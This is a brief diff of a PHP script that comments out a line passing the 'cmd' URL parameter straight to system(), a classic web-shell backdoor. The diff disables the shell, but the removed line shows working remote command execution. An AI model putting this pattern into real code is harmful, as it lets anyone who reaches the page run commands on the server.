@@ -8,7 +8,7 @@
 <?php
     if(isset($_GET['cmd']))
     {
-        $comando = system($_GET['cmd']);
+        //$comando = system($_GET['cmd']);
         while($comando != ""){
             echo "1<br>";
             flush();
